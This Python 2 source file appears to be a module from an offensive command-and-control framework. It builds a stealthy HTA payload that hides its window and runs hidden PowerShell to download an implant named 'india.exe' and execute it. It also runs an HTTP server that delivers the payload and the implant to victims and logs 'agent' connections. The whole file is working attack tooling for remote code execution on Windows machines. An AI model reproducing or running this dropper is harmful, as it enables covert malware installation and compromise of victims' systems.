from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from SocketServer import ThreadingMixIn
from threading import Thread
from core.color import color
from core.data import viewbag


class mshta:
    def __init__(self):
        self.port = 4444
        self.address = "127.0.0.1"
        self.implant_name = 'india.exe'
        self.implant_link = 'http://127.0.0.1:4444/' + self.implant_name
        self.implant_path = 'C:\\xampp\\htdocs\\' + self.implant_name
        self.payload = """
<HTML>
    <HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
        <script>
            try {
            moveTo(-100,-100);resizeTo(0,0); 
            a=new ActiveXObject('Wscript.Shell');
            a.Run("PowerShell -windowstyle hidden $d=$env:temp+'\\\\india.exe'; (New-Object System.Net.WebClient).DownloadFile('%s',$d); Start-Process $d;");
            } catch (e) {}
        </script>
</HTML>""" % self.implant_link

    @staticmethod
    def utf8len(s):
        return len(s.encode('utf-8'))

    def getPayload(self):
        return self.payload


class Handler(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_GET(self):
        try:
            if self.path == '/hta':
                if viewbag.NOTIFY_CONNECTION:
                    print color.ReturnGreenNotify('[+] New agent request -> HTA payload (%s)' % self.client_address[0])
                self.send_response(200)
                message = ''
                message += mshta().getPayload()
                self.end_headers()
                self.wfile.write(message)
                if viewbag.NOTIFY_CONNECTION:
                    print color.ReturnGreenNotify('[*] Powershell PAYLOAD sent (%s Bytes) -> %s' % (mshta().utf8len(mshta().getPayload()), self.client_address[0]))
                return
            elif self.path == '/' + mshta().implant_name:
                self.send_response(200)
                self.end_headers()
                with open(mshta().implant_path, 'rb') as file_:
                    self.wfile.write(file_.read())
                if viewbag.NOTIFY_CONNECTION:
                    print color.ReturnGreenNotify("[+] Agent has downloaded the payload -> %s" % mshta().implant_name)

        except Exception, e:
            print color.ReturnError("mshta.do_GET -> " + str(e))


class ThreadingServer(ThreadingMixIn, HTTPServer):
    pass


def runmshta():
    serveraddr = (mshta().address, mshta().port)
    srvr = ThreadingServer(serveraddr, Handler)
    srvr.serve_forever()


def serve():
    print color.ReturnArrowBlue('mshta http://%s:%s/hta' % (mshta().address, str(mshta().port))) + '\n'
    thread = Thread(target=runmshta)
    thread.start()







